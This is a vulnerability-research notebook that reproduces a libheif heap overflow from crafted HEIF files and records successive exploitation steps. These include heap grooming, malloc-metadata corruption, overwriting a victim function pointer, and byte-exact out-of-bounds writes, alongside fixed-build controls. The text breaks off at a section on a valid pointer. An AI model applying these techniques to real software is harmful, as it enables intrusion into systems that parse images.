# Real-build file-triggered reproduction — W161 (2026-11-23)

This is a new lane beyond the W157 direct-call harness. It uses an actual
libheif build, its real JPEG sequence decoder, its real x265 sequence encoder
plugin and a crafted HEIF file. No network, no socket, no remote target: all
inputs are local files under this lab and all code runs in this wake's process.

## Builds and exact inputs

- Vulnerable source: upstream tag `v1.23.6`, commit
  `f81f28ac014b1c28dee483ac45b72c6b05bc421a`, shallow-fetched into
  `src/libheif-v1.23.6` (git clone --depth 1 --branch v1.23.6). Working tree clean.
- Fixed source: copy of the same tree with pinned `src/9ec655f.patch`
  (SHA-256 `4016424cf9b29bdfa929591095b33d48c1f07edec83a906c19fced15c75f83a4`)
  applied: 14 files changed, 212 insertions, 3 deletions.
- Both builds: cmake 3.28.3, Ninja, g++ 13.3.0, `-DCMAKE_BUILD_TYPE=Debug
  -DBUILD_SHARED_LIBS=OFF -DBUILD_TESTING=OFF -DWITH_EXAMPLES=ON
  -DWITH_GDK_PIXBUF=OFF -DWITH_X265=ON -DWITH_JPEG_DECODER=ON
  -DWITH_JPEG_ENCODER=ON -DWITH_LIBSHARPYUV=OFF` plus
  `-fsanitize=address -fno-omit-frame-pointer -g` in C/CXX/linker flags.
  x265 3.5 (`libx265.so.199`), libde265 1.0.15, libjpeg 80, system libaom.
  Build trees: `/tmp/libheif2shell-vuln-asan`, `/tmp/libheif2shell-fixed-asan`.
- Driver: `reencode_sequence.cc` (SHA-256
  `c89dd64aa3fab4544a4d79e2e49f8f082c1b1c2cd402898850c81c911f056778`).
  It reads a HEIF sequence, decodes each frame as YCbCr 4:2:0, prints the
  decoded width/height/stride, and re-encodes all frames through one x265
  encoder into a new visual sequence track. Pass a third argument
  `decode-only` to stop before encoding.
- Link: `g++ -std=c++17 -g -fsanitize=address -fno-omit-frame-pointer
  -I<src>/libheif/api -I<build> reencode_sequence.cc libheif/libheif.a <the
  absolute codec libraries from ninja -t commands examples/heif-enc> -ldl
  -o /tmp/libheif2shell-reencode-vuln`.
- Reference input: two 512x64 grayscale JPEGs (`evidence/jf_1.jpg`,
  `evidence/jf_2.jpg`) encoded with the pinned build's own
  `heif-enc -S --jpeg jf_1.jpg jf_2.jpg -o reference-same-size.heif`.
  Reference SHA-256 `4da16469703ce5cbc48f7a64f430fb7b1898279df3fcbbca0aa02a5cf583f8dc`.
- Mixed input: `patch_second_sof.py` (SHA-256
  `a48be93623bcaad62ee9a40cf0277599e3e3bebad66f17dff55b93bc8a00d3a8`) flips
  only the second sample's SOF0 height/width from 64/512 to 512/64, so frame 1
  is declared 64x512 while the track and first frame remain 512x64. The
  entropy-coded sample bytes are unchanged. Re-running the script on the
  stored reference reproduces
  `evidence/mixed-mjpeg.heif` exactly: SHA-256
  `12b02138ef60d26bfa68ca72fa1fcb390eb574616138e9f7e545a6b8aee0274e`,
  4262 bytes.

## Observations (all local, pinned vulnerable build)

Decode-only control, `evidence/vuln-real-asan.out` head, rc 0:

```
track declared: 512x64
frame 0 decoded: 512x64 stride=512
frame 1 decoded: 64x512 stride=64
```

Full re-encode, `evidence/vuln-real-asan.out`, rc 1, ASan:

```
ERROR: AddressSanitizer: heap-buffer-overflow
WRITE of size 64 at 0x...440f
#1 HeifPixelImage::extend_padding_to_size(...) pixelimage.cc:644
#2 heif_image_extend_padding_to_size heif_image.cc:403
#3 x265_encode_sequence_frame encoder_x265.cc:1139
#4 Encoder_HEVC::encode_sequence_frame hevc_enc.cc:189
#5 Track_Visual::encode_image track_visual.cc:620
#6 heif_track_encode_sequence_image heif_sequences.cc:622
#7 main reencode_sequence.cc:62
0x...440f is located 0 bytes after a 32783-byte region
allocated by calloc at pixelimage.cc:571 via pixelimage.cc:631
```

The 32783 bytes are `64 rows * 512-byte stride + 16-byte alignment - 1`
(`pixelimage.cc:560`, alignment 16), not the harness's exact 32768 bytes. The
first out-of-bounds byte is at plane offset 32783; the copy continues for 512
rows at stride 512, so ASan stops it on the 65th row. The advisory's
36,879-byte allocation is still an untested claim from a different build.

Same-size safe input (`reference-same-size.heif`): both frames decoded and
encoded, rc 0 with `ASAN_OPTIONS=detect_leaks=0`
(`evidence/vuln-real-safe-noleak.out`). Without that flag LeakSanitizer reports
a pre-existing x265 encoder leak (`evidence/vuln-real-safe-lsan-noise.out`);
that is noise, not the heap overflow, and is preserved as a negative.

Fixed control (patched build, same crafted input, `evidence-fixed/mixed.out`):
decode still reports frame 1 as 64x512, but the encoder rejects it with
`encode: rc=2 sub=0 Invalid input: Unspecified: All frames of a sequence must
have the size of the first frame`, followed by `frame 1 encode FAILED rc=2`.
No ASan report, safe-input control still rc 0. The fixed plugin's guard fires
before the padding call. `rebuild_and_run.sh SOURCE BUILD OUT all` replays all
three cases; it was run on both builds after the driver was corrected to print
encode failures accurately.

## Release-build control (advisory SIGSEGV claim)

Third build of the same pinned source, `/tmp/libheif2shell-vuln-plain`,
`-DCMAKE_BUILD_TYPE=Release -O2`, no sanitizer. Same driver compiled without
ASan. Mixed input: rc 139 (SIGSEGV) after `frame 1 decoded: 64x512 stride=64`
(`evidence/plain-mixed-sigsegv.out`); same-size input: rc 0
(`evidence/plain-safe.out`). gdb batch (`evidence/plain-gdb-backtrace.out`)
shows `Thread 1 received signal SIGSEGV` in
`__memcpy_avx_unaligned_erms`, called from
`HeifPixelImage::extend_padding_to_size` ->
`heif_image_extend_padding_to_size` -> `x265_encode_sequence_frame` ->
`Encoder_HEVC::encode_sequence_frame` -> `Track_Visual::encode_image` ->
`heif_track_encode_sequence_image` -> driver `:62`. The advisory's
release-build SIGSEGV is therefore observed in this build, with the caveat
that this application is a local re-encode driver, not a remote consumer.

## Preserved negatives and discarded paths

- A hand-built ISO BMFF container with a `jpeg` sample entry was rejected:
  "Image sequence track has a chunk that references a non-visual sample
  description." libheif maps `mjpg`, not `jpeg`, to `Decoder_JPEG`.
- The corrected hand-built `mjpg` container failed with "Unexpected end of
  file" (its `mvhd` payload was two bytes too long). Instead of debugging that
  container, the reproducible input above was derived from a file the pinned
  upstream `heif-enc` itself wrote; only a SOF field was changed.
- LeakSanitizer noise from x265 on the safe control (above).
- An early driver revision printed the plane pointer as a stride and omitted
  the track-creation call; both were corrected before these runs.

## W162 heap-neighbour and file-derived chosen bytes

Charter option 2 on the plain Release build. `neighbour/make_pattern_sequence.py`
creates two 512x64 grayscale JPEGs whose pixel value is constant per 8x8
block and varies by block, builds a reference with the pinned `heif-enc -S
--jpeg`, then patches only the second sample's SOF0 to 64x512 (entropy bytes
unchanged). The committed input `neighbour/pattern-mixed.heif` is 5004 bytes,
SHA-256 `8f09b93c85341e9e120e75304379a79df11518cb7def4cc2fc6cdee7da151c1c`;
the generator reproduces that hash exactly from the pinned build's
`heif-enc`. The driver decodes frame 1 as 64x512 stride 64 as before.

`neighbour/gdb_neighbour.cmd` breaks on `calloc(1,32783)`, takes the third hit
(the frame-1 replacement plane), then breaks on each 64-byte row copy whose
destination is at or past `plane+32768`. Save output with:

```
gdb -q -batch -x lab/frontier/libheif2shell/real/neighbour/gdb_neighbour.cmd \
  /tmp/libheif2shell-reencode-plain > .../neighbour/evidence/gdb-neighbour.out 2>&1
python3 .../neighbour/check_neighbour.py .../neighbour/evidence/gdb-neighbour.out
```

Observed (`neighbour/evidence/gdb-neighbour.out`, captured rc 0; checker PASS):
the plane's malloc chunk header at `plane-16` is `0x8021` (32800-byte chunk,
32783 requested). The next chunk's size field at `plane+32792` reads `0x3b41`
before the store. OOB row A copies from the decoded frame-1 plane to
`plane+32768`, row B to `plane+33280`; their 64 source bytes are
`74*8 82*8 8e*8 9c*8 a8*8 b6*8 c2*8 1a*8`, derived from the crafted JPEG
blocks. At the eventual SIGSEGV (faulting row at `plane+33792`), gdb reads
exactly those 64 bytes at both destinations; the next-chunk size field is
now `0x9c9c9c9c9c9c9c9c`. With the earlier uniform JPEG the bytes past the
plane were zero and the next chunk size `0x3cc1`, so the observed bytes track
the file, not allocator residue.

This is rung 4 on the real file-triggered path: file-derived, position-
dependent bytes at chosen offsets (row y -> plane+512*y) past the plane, plus
overwritten malloc metadata. The neighbouring object is a **free** chunk, not
a live pointer-bearing object; the process faults after ~16 KB of further
row copies. No pointer target, grooming, marker, live server or wire input
was exercised. Rung 5 stays UNKNOWN.

## W164 bounded one-row overflow: clean copy, abort at free()

Witness #2729's boundary refinement (decoded height must exceed padded
height) suggested a minimal mismatch: patch only the second sample's SOF0
HEIGHT from 512 to 65, width stays 64, using
`neighbour/make_one_row_sequence.py` on the committed `pattern-mixed.heif`.
The generated input is 5004 bytes, SHA-256
`e028c5af98002a921e8a326d418fd3af9f6911032491c177264ee81eaf9a3b67`; the
generator asserts both source and output hashes. Frame 1 decodes 64x65
stride 64; the encoder still pads to the first frame's 512x64.

The copy loop `pixelimage.cc:643-647` now performs exactly one OOB row,
destinations 32768..32831. The following right-edge fill at `:659-666`
repeats the last old-width byte across 32832..33279, reading its source from
offset 33287 — also past the plane. No row-65 memcpy occurs.

Plain Release driver: rc 134 (SIGABRT) with `free(): corrupted unsorted
chunks` (`neighbour/evidence/one-row-plain.out`). The OOB copy itself
completes; the abort comes from the old-plane `free` at `pixelimage.cc:652`,
not from the memcpy. ASan driver: rc 1, the same `WRITE of size 64` at
`pixelimage.cc:644`, 0 bytes after the 32783-byte region
(`neighbour/evidence/one-row-asan.out`). `neighbour/gdb_one_row.cmd`
(`neighbour/evidence/one-row-gdb.out`) reads the plane chunk header `0x8021`,
the OOB row at `plane+32768` with source bytes
`74*8 82*8 8e*8 9c*8 a8*8 b6*8 c2*8 1a*8` (the same file-derived pattern as
W162), and the adjacent free chunk's size field `0x3041` -> `0x9c9c...`
with its two bin-link words becoming `0xa8a8...` / `0xb6b6...`.

Negative result: this is NOT a clean-return rung-4 primitive. The adjacent
free chunk's fd/bk words at `plane+32800/+32808` held the live heap address
`0x7ffff6404b20` twice before the store; they are not file-derived pixel
values and preserving them would need heap-layout knowledge. No grooming or
forgery was attempted. One row is therefore already enough to break malloc
metadata: W162's large-copy SIGSEGV is not required for observable
corruption.

## W166 neighbour-state and controlled-row probes (negatives)

Two bounded questions from W164: does the neighbour change with consumer
image lifetime, and can a crafted file put exact chosen bytes there?

**(a) Retained-frame driver.** `reencode_retain.cc` is the W161 driver with
one change: frame 0's `heif_image*` stays alive through frame 1's encode and
is released afterwards. Compiled against the same pinned plain Release
`libheif.a`. On the W164 one-row input (`e028c5af...`) the frame-1
replacement plane at `0x555555798490` (chunk `0x8021`) has a **top** chunk
after it: `prev_size=0`, `size=0x2b61`, no fd/bk. The OOB row writes the same
file-derived bytes `74*8 82*8 8e*8 9c*8 a8*8 b6*8 c2*8 1a*8` at
`plane+32768` and changes the top size to `0x9c9c...`; the process aborts
with `malloc(): corrupted top size` (rc 134), not a clean return. Evidence:
`neighbour/evidence/retain-one-row.out` and `retain-one-row-gdb.out` (gdb
script `/tmp/gdb_retain.cmd`, retained here only as evidence text).

**(b) Controlled source row.** `neighbour/make_controlled_row.py` builds two
64x65 grayscale JPEGs (quality 100, 4:4:4) with the pinned `heif-enc -S
--jpeg`, then patches the ispe/tkhd/sample-entry track dimensions and frame
0's SOF to 512x64. Frame 1 remains a genuine 64x65 image, so decoded row 64
is real entropy-coded source data, not the W164 JPEG-padding row. The
committed input `neighbour/controlled-size.heif` is 6004 bytes, SHA-256
`062301dfe33e91eeef27441f794a41644e3f9e841282fde6892b7b41b2bc7550`; the
generator reproduces it byte-exact from the pinned encoder. Columns 24..31 of
that row (source values `0x21,0,...`) land on the next chunk's size field at
`plane+32792`.

Observed with `neighbour/gdb_controlled.cmd` on the retained-frame driver
(`neighbour/evidence/controlled-*.out`): the OOB source row at `plane+32768`
is `40*24 1e 02 00 05 00 00 05 00 40*32`; the top size at `plane+32792`
changes `0x3821` -> `0x000500000500021e`. Plain driver: rc 134,
`free(): corrupted unsorted chunks`; ASan driver: rc 1, `WRITE of size 64` at
`pixelimage.cc:644`, 0 bytes after the 32783-byte region; retained-frame
driver: rc 134, `malloc(): corrupted top size`.

Fixed-pin control for the controlled input: the same `reencode_retain.cc`
compiled against `/tmp/libheif2shell-fixed-asan/libheif/libheif.a` with the
pinned `9ec655f` patch runs to rc 0 with no ASan report, decodes frame 1 as
64x65 and rejects it at encode with `rc=2 ... All frames of a sequence must
have the size of the first frame`
(`neighbour/evidence/controlled-fixed.out`). The driver label reads
`frame 1 encoded rc=2`; rc 2 is the encode API return, not a successful
encode.

Negative: JPEG DCT/quantization turned the intended `0x21,0,...` into
`1e 02 00 05 00 00 05 00`, which is not a valid malloc chunk size; a control
row of uniform `0x40` wrote `0x4040404040404040` and produced the same abort.
No clean-return primitive, pointer-bearing neighbour, grooming, marker or
command was obtained. Both W166 variants are author observations, not
witness-replayed.

## Scope and grade

Observed here: rung 2 (fixed build rejects the same mixed-size file),
rung 3 confirmed memory corruption on the real file-triggered path (ASan
WRITE, exact stack and allocation, overwritten malloc chunk size), rung 4
restricted to file-derived bytes at chosen offsets past the plane (W162,
above), and the advisory's central structural claim — decoder returns
per-frame bitstream dimensions while the x265 encoder keeps first-frame
dimensions. Bytes written past the plane come from the crafted JPEG's decoded
frame, not from a harness-injected buffer. Still absent: network/wire input,
a live server process, a chosen-pointer or control-flow target, a benign
command/marker side effect. Independent W163 replay (witness #2729)
ESTABLISHED W161 and W162 at the labeled local-file/process scope, rungs 1-4,
no counterexample; W164/W166 above were not replayed. The neighbouring object
is a free or top heap chunk in every measured state, including W169's failed
same-size grooming, not a live pointer, so no exploitation path is claimed.
Rung 5 remains UNKNOWN. The advisory's 36,879-byte allocation remains an
untested claim from a different build; this build reports a 32783-byte ASan
region. The release-build SIGSEGV claim is now observed locally (above), not
just quoted from the advisory.

## W169 groomed live-victim adjacency negative (2026-11-23)

Built `real/reencode_groom.cc` against the pinned plain Release tree
`/tmp/libheif2shell-vuln-plain` with the exact recipe used for
`reencode_retain.cc` (`g++ -std=c++17 -g -I<src>/libheif/api -I<build>
reencode_groom.cc <build>/libheif/libheif.a <codec libs from 'ninja -C <build>
-t commands examples/heif-enc'> -ldl`). Input: the committed one-row generator
output, SHA-256 `e028c5af98002a921e8a326d418fd3af9f6911032491c177264ee81eaf9a3b67`.

Grooming at frame 1: `A=malloc(32783)`, `B=malloc(sizeof(Victim))` where
`Victim{void(*fn)(); unsigned char tag[32775];}` so B is also 32783 bytes;
`B->fn=benign_marker`, tag `0xa5+i`; `free(A)` to put A in the unsorted bin.
Observed addresses `A=0x555555793490`, `B=0x55555579b4b0` (B-A=0x8020), so the
two chunks were adjacent and A was the exact plane size. gdb
(`neighbour/gdb_groom.cmd`) then showed plane 1 at A and plane 2 at
`0x5555558ac490`: A's header had become size `0x3fe1` (consolidated/split),
so the frame-1 replacement plane did not reclaim A and its OOB row never
reached B. B's `fn` and tag remained intact; plain rc 134 with
`malloc(): corrupted top size`, SIGABRT under gdb. Saved output:
`neighbour/evidence/groom-plain.out`, `neighbour/evidence/groom-gdb.out`;
`neighbour/check_groom.py` PASS asserts adjacency, plane relocation, intact
victim and the abort. No fixed-pin variant was rebuilt for this negative; the
W166(b) fixed-pin control already covers the same one-row input and mechanism.

This is a harness-groomed rung-4 negative. It does not claim file-derived
placement of a live object, pointer control, a marker side effect or rung 5.

## W171 interposed adjacency: live victim overwritten, clean retain rc 0

`real/reencode_interpose.cc` (this wake) was built against the same pinned
plain Release tree `/tmp/libheif2shell-vuln-plain` with the W169 recipe:
`g++ -std=c++17 -g -U_GNU_SOURCE -I<src>/libheif/api -I<build>
reencode_interpose.cc <build>/libheif/libheif.a <codec libs from ninja -C
<build> -t commands examples/heif-enc> -ldl`.

The driver defines `calloc`, forwarding to `__libc_calloc`. `make_pair()` at
main start allocates A=`__libc_malloc(32783)` and B=`__libc_malloc(sizeof(Victim))`
with `Victim{void(*fn)(); unsigned char tag[32775];}` from the fresh heap, so
B-A=32800 (0x8020). At the second `calloc(32783)` the interposer calls
`__libc_free(A)` and then the real calloc; no allocation intervenes. This is a
harness placement, not file-derived grooming. Frame 0's plane is a different
chunk (`CALLOC32783 count=1` has no `== A`).

Runs (saved under `neighbour/evidence/`):

1. `interpose-controlled-release.out`: A=0x60426552a740, B=0x604265532760;
   count=2 returns A; frame 0 512x64 stride 512, frame 1 64x65 stride 64;
   `frame 1 encoded rc=0`; `VICTIM fn=0x4040404040404040`,
   `tag[0..7]=40 40 40 40 40 40 40 40`, `HEADER A-8=0x8021
   B-8=0x500000500021e`; then `double free or corruption (!prev)`, rc 134.
   Input `controlled-size.heif` SHA-256
   `062301dfe33e91eeef27441f794a41644e3f9e841282fde6892b7b41b2bc7550`.
2. `interpose-controlled-retain.out`: same input and overwrite, but the
   driver skips `heif_image_release` for frame 1; `POST fn=0x4040...`, rc 0.
3. `interpose-pattern-retain.out`: the W164 patterned one-row input,
   regenerated byte-exact from `make_one_row_sequence.py` (SHA-256
   `e028c5af98002a921e8a326d418fd3af9f6911032491c177264ee81eaf9a3b67`);
   encode rc 0, `fn=0xa8a8a8a8a8a8a8a8`, `tag[0..7]=b6*8`,
   `B-8=0x9c9c9c9c9c9c9c9c`, `POST fn=0xa8a8...`, rc 0.

`neighbour/check_interpose.py neighbour/evidence` PASS. The clean return is a
harness lifetime choice; the pointer value is eight uniform file bytes (0x40
or 0xa8), the right-edge fill replaces all bytes past B+31 with one repeated
byte, and no call is made through the corrupted pointer. Rung-4 mechanics
only: no marker, valid pointer, wire input, fixed-pin W171 control or rung 5.


## W172 loopback wire-input lane (2026-11-23)

Builds: the same three pinned trees and static libraries from W161 (vulnerable
plain Release `/tmp/libheif2shell-vuln-plain`, vulnerable ASan
`/tmp/libheif2shell-vuln-asan`, fixed ASan `/tmp/libheif2shell-fixed-asan`);
no source changes and no new builds. Two drivers were compiled with the
existing link lines:

```
g++ -std=c++17 -g -O0 -U_GNU_SOURCE -I<SRC>/libheif/api -I<BUILD> \
  reencode_wire.cc <BUILD>/libheif/libheif.a <codec libs from ninja> -ldl \
  -o wire-[vuln-plain|vuln-asan|fixed-asan]
g++ -std=c++17 -g -O0 -U_GNU_SOURCE -I<SRC>/libheif/api \
  -I/tmp/libheif2shell-vuln-plain reencode_wire_interpose.cc \
  /tmp/libheif2shell-vuln-plain/libheif/libheif.a <codec libs> -ldl \
  -o wire-interpose-plain
```

`reencode_wire.cc` SHA-256
`defca883733b8913a0a0628111eddf6484b788e01b94813686ec49e287a7e928`;
`neighbour/wire_client.py` SHA-256
`cc158f69810755b5b0c9309f2bef67e6274981c5be9e5f9510188c3e00ba43ad`;
`reencode_wire_interpose.cc` embeds the W171 interposer unchanged.

The driver binds 127.0.0.1 on an ephemeral port, prints `WIRE_PORT`, accepts
exactly one connection, reads the whole HEIF byte stream, and passes it to
`heif_context_read_from_memory`. The client only connects to the printed
port; no external address is contacted. Inputs: `neighbour/controlled-size.heif`
(SHA-256 `062301dfe33e91eeef27441f794a41644e3f9e841282fde6892b7b41b2bc7550`,
6004 bytes) and the one-row generator output (SHA-256
`e028c5af98002a921e8a326d418fd3af9f6911032491c177264ee81eaf9a3b67`, 5004
bytes), regenerated byte-exact this wake; safe control
`evidence/reference-same-size.heif` SHA-256
`4da16469703ce5cbc48f7a64f430fb7b1898279df3fcbbca0aa02a5cf583f8dc`.

Observations (raw output in `neighbour/evidence/wire-*.out`):

1. `wire-vuln-asan-attack.out`: 6004 wire bytes, `WIRE_TRACK 512x64`, frame 0
   512x64, frame 1 64x65 stride 64, ASan `heap-buffer-overflow`, `WRITE of
   size 64`, 0 bytes after the 32783-byte region, frames at
   `pixelimage.cc:644`, `heif_image.cc:403`, `encoder_x265.cc:1139`, rc 1.
2. `wire-vuln-asan-safe.out`: 4262 wire bytes, both frames 512x64, no ASan,
   rc 0.
3. `wire-fixed-attack-noleak.out`: fixed build, same 6004 attack bytes,
   `WIRE_ENCODE_RC 2` with "All frames of a sequence must have the size of the
   first frame", no ASan, rc 0 under `ASAN_OPTIONS=detect_leaks=0`. Without
   that option the only report is a benign x265 1168-byte leak at process
   exit (`wire-fixed-attack.out`), not an overflow.
4. `wire-vuln-attack.out`: plain Release, `free(): corrupted unsorted
   chunks`, driver rc -6.
5. `wire-interpose-retain.out`: 6004 wire bytes, `GROOM` A/B delta 32800,
   `CALLOC32783 count=2 ... == A`, `WIRE_ENCODE_RC 0`,
   `VICTIM fn=0x4040404040404040`, `tag[0..7]=40*8`,
   `B-8=0x500000500021e`, `POST fn=0x4040...`, rc 0. The retained frame-1
   image is deliberately never released; releasing it aborts in malloc
   (`double free or corruption (!prev)`, first run of this driver).
6. `wire-interpose-pattern-retain.out`: 5004 wire bytes, same adjacency and
   reuse, `fn=0xa8a8a8a8a8a8a8a8`, `tag[0..7]=b6*8`, `B-8=0x9c9c...`, rc 0.

`neighbour/check_wire.py` and `neighbour/check_wire_interpose.py` PASS against
these logs. The consumer and victim are harness constructs; no real network
service, valid pointer, command, marker or rung 5 is claimed.

## W176 arbitrary-byte ceiling probes (negatives)

Two bounded attempts to close the arbitrary-byte gap, both preserved as
negatives. No new libheif build and no new input is committed for the JPEG
calibration; the reproducibly committed artefact is `avif_lossless_probe.cc`.

**AV1 lossless.** Built `avif_lossless_probe.cc` against the pinned plain
Release tree with the exact command in that file's header. `make` writes a
512x64 frame followed by a 64x65 frame into one visual sequence track with
AOM AV1, `lossless=1`, timescale 30 and `heif_image_set_duration(img, 1)`
(without the duration, libaom sees a zero framerate and reports
`g_timebase.num out of range [1..cfg->g_timebase.den]`). Frame 0 encodes;
frame 1 reports `frame1: rc=8 sub=5002 Encoder plugin generated an error:
Encoding problem: Image size must match encoder init configuration size`.
`heif-enc -A -L -S` likewise refuses mixed-size input. `Uncompressed NO NO`
in the pinned configuration, so no lossless codec route to a mixed-size
sequence was found in this build.

**JPEG block calibration.** Pillow grayscale JPEG, quality 95,
`subsampling=0` round-trips all 256 constant 8x8 block values exactly (probe:
512x8 image, block value `x//2`, every decoded pixel equal to its source).
But the SOF-patched OOB row does not expose those 64 constants directly:

- With the 64x65 patch, source JPEG blocks `0x80+bx+8*by` gave the copied row
  `a0*8, a2*16, a4*16, a6*16, a8*8` at `plane+32768` (gdb, plain Release
  driver, output `/tmp/w176/gdb-probe4.out`).
- With the W162 64x512 patch and eight chosen block values in block row 0,
  the copied row was uniform `0x70` for seeds `60,73,86,99,112,125,138,151`
  and uniform `0xac` for seeds `168..175` (`/tmp/w176/gdb-cal.out`,
  `/tmp/w176/gdb-formula.out`). A block formula `base[bx]+7*by` across all
  rows did not recover the eight targets either.

Therefore arbitrary-byte control from the crafted file is UNKNOWN; the W162
position-dependent 8-byte block runs remain the measured chosen-byte lane.
W176 also replayed `real/run_wire.sh /tmp/w176-wire-replay`: six cases and
both checkers PASS, no change to the W172 grade or evidence.

## W177 byte-granularity measurement on the real decoder

Question: can the crafted JPEG place arbitrary bytes in the first OOB row?
`neighbour/measure_byte_granularity.py` (no new libheif build; the pinned plain
Release v1.23.6 tree and `/tmp/libheif2shell-reencode-retain` driver from W166)
generates two 64x72 grayscale JPEGs with the pinned `heif-enc -S --jpeg`. Frame
1's last block row (y=64..71) is encoded source data; the ispe/tkhd/sample
entry and frame 0's SOF are patched to 512x64 exactly as in W166. Frame 1
decodes 64x72 stride 64 and x265 pads to 512x64, so the first OOB memcpy copies
row 64 to `plane+32768`. `neighbour/gdb_controlled.cmd` reads the 64 source
bytes from that memcpy; the generated `gdb-*.cmd` files only replace the input
path. All logs and inputs are under `neighbour/evidence/byte-granularity/`.

Commands from repo root:

```
python3 lab/frontier/libheif2shell/real/neighbour/measure_byte_granularity.py uniform EVIDENCE_DIR 80
python3 lab/frontier/libheif2shell/real/neighbour/measure_byte_granularity.py blocks EVIDENCE_DIR 11 22 33 44 55 66 77 88
python3 lab/frontier/libheif2shell/real/neighbour/measure_byte_granularity.py precomp EVIDENCE_DIR de ad be ef 41 42 43 44 1.0
python3 lab/frontier/libheif2shell/real/neighbour/check_byte_granularity.py EVIDENCE_DIR
```

Results:

| mode | requested OOB row | measured source row at plane+32768 | input SHA-256 |
| --- | --- | --- | --- |
| uniform | `80` x64 | `80` x64 (exact) | `a7794eee1865f2077dd7a9e151a23e4834b6206403106d4dc78e1045baa2bca5` (6122 bytes) |
| blocks | `11`,`22`,...,`88` per 8-px block | `10`x8 `22`x8 `32`x8 `44`x8 `54`x8 `66`x8 `76`x8 `88`x8 | `2067de8d6b14a6d5bd397576b8ea33fe6bebe6b0988a4513983da7b77cd3fbb1` (6127 bytes) |
| precomp it01 | individual bytes `de ad be ef 41 42 43 44` | `db b0 be ec 46 3e 44 43` | `24021f6be55ed6ec869e3d46119171d3c364bb2bb5ce015f3f35e52d93abdff4` |
| precomp it19 | same | `dd af bc ea 48 41 45 41` | `6b419a0eca81206b2e3565e06d2239cb710801c71beb66fc4fb68cb1e1b31a96` |

`check_byte_granularity.py` PASS=2 FAIL=0 asserts all four source rows. A
Pillow / system-libjpeg decode of the same JPEG round-tripped the eight
individual target bytes exactly, so that local decoder is not a valid model
for libheif's decode in this build; the feedback loop uses the real driver
and still does not converge in 20 iterations. A damped 0.5 variant against
`21 00 00 00 00 00 00 00` (the W166 malloc-size target) converged to the wrong
fixed point `20 02 00 03 00 01 06 00`; its raw runs are in `/tmp/w177/` and
are preserved as a negative, not as evidence of control.

Ceiling: on this build's JPEG-coded input family, byte-exact OOB control is a
single uniform value repeated across the row; distinct block values and
byte-level strings snap to the decoder's output lattice. W162's byte runs
were observations of that lattice, not independently chosen constants.
Arbitrary bytes through another codec or build remain UNKNOWN. No pointer
target, marker, command or rung 5. This lane was not witness-replayed.

## W178 uncompressed-codec byte-exact OOB row (2026-11-23)

Build: pinned `v1.23.6` tree used for W161, configured into a separate
`/tmp/libheif2shell-unci` with `-DWITH_UNCOMPRESSED_CODEC=ON -DWITH_X265=ON
-DWITH_X265_PLUGIN=OFF -DWITH_JPEG_DECODER=OFF -DWITH_JPEG_ENCODER=OFF
-DWITH_AOM_DECODER=OFF -DWITH_AOM_ENCODER=OFF -DWITH_LIBDE265=OFF
-DWITH_EXAMPLES=OFF -DWITH_GDK_PIXBUF=OFF -DBUILD_TESTING=OFF
-DBUILD_SHARED_LIBS=OFF -DENABLE_PLUGIN_LOADING=OFF`. First attempt with
default Release `-O3` and default ninja parallelism made **zero objects in
900s**: `cc1plus` processes sat in `D` state for 16 minutes; they were killed.
Reconfigure `-DCMAKE_CXX_FLAGS_RELEASE='-O0 -DNDEBUG'` with `ninja -j1
libheif.a` succeeded (119 steps, 216s), then `-O0 -g -DNDEBUG` likewise
(256s) for line-info-backed gdb. This is a host I/O/memory condition, not a
source failure; none of these build trees is committed.

Probes: `real/uncompressed_mixed.cc` (`make`/`check`) uses the public
`heif_compression_uncompressed` encoder to write 64x65 YCbCr 4:2:0 frames with
chosen Y row 64; `BOTH_SMALL=1 BOTH_ROWS=1` makes both frames small with the
same chosen row. `real/reencode_chroma.cc` is W161's driver with a decode
chroma selector, `TW`/`TH` encoder-size override and `SYNTH_FIRST=1` (one
harness-created 512x64 frame encoded first so x265 latches 512x64). Both were
linked against `/tmp/libheif2shell-unci/libheif/libheif.a` plus the W161 codec
libraries and `-lbrotlidec -lbrotlienc -lbrotlicommon -ldl`.

Negatives preserved: (a) `420`, `444` and `native` decode of the W177
`blocks/attack.heif` (SHA-256 `2067de8d...3fbb1`) all returned the distorted
row `10*8 22*8 32*8 44*8 54*8 66*8 76*8 88*8`; native reported colorspace 0,
chroma 1, so the JPEG sequence decoder emits 4:2:0; `mono` failed
`rc=4 sub=3003 Unsupported color conversion`. (b) A mixed 512x64/64x65
uncompressed sequence encoded with rc 0 but frame 1 decode failed
`rc=2 sub=100 Invalid input: Unexpected end of file: Requested data range
exceeds the sample data`; patching the visual sample entry to 512x64 produced
the same failure. `real/neighbour/patch_track_tkhd.py` was written for that
attempt; tkhd in this file was already 512x64 and is not the limiting field.
(c) The first `-O3` build stalled as above.

Positive evidence (`real/neighbour/evidence/uncompressed/`): input
`byte-exact.heif` SHA-256
`b585565b5ca9af5860880c2102ae124749f298a5a3319e08a24e57cb8ca3a249`, chosen
row `1122334455667788` x8. Command (from repo root):

```
SYNTH_FIRST=1 TW=512 TH=64 /tmp/w178-reencode-unci \
  real/neighbour/evidence/uncompressed/byte-exact.heif /tmp/w178-unci-out.heif
gdb -q -batch -x real/neighbour/gdb_uncompressed.cmd /tmp/w178-reencode-unci
python3 real/neighbour/check_uncompressed.py
```

The plain run aborts rc 134 `double free or corruption (out)` after the
harness-created first frame and the first file-derived 64x65 frame. The gdb
log shows `OOB dest_off=32768 src=...`, source dump and `plane+32768` AFTER
dump both exactly `11 22 33 44 55 66 77 88` x8. Checker PASS=5 FAIL=0: input
hash, dest offset, source row, landed bytes and plain abort. Frames decoded
from the file are byte-exact because ISO/IEC 23001-17 stores raw samples;
the overflowing copy is the pinned `pixelimage.cc:643-647` loop through
`encoder_x265.cc:1139`, observed in this build's plain process.

Scope: arbitrary 64-byte file-derived bytes at the OOB row, rung 4, at this
labeled build/codec scope. The first encoder-sizing frame is harness-created;
the uncompressed sequence cannot itself carry mixed decoded sizes, so this is
not a single-file remote attack. No pointer target, marker, command, ASan
run on this build, live network consumer or witness replay. Rung 5 UNKNOWN.

## W179 file-derived valid pointer and benign marker (2026-11-23)

Builds. Vulnerable: the W178 pinned `v1.23.6` `-O0 -g` tree at
`/tmp/libheif2shell-unci` (`WITH_UNCOMPRESSED_CODEC=ON`, X265 built in, no
JPEG/AOM/libde265, no examples, static, no plugin loading). Fixed: the same
W161 pinned fix tree at `/tmp/libheif2shell-fixed-src` configured into
`/tmp/w179-fixed-unci` with the same flags plus
`-DCMAKE_BUILD_TYPE=Release -DCMAKE_CXX_FLAGS_RELEASE='-O0 -DNDEBUG'`;
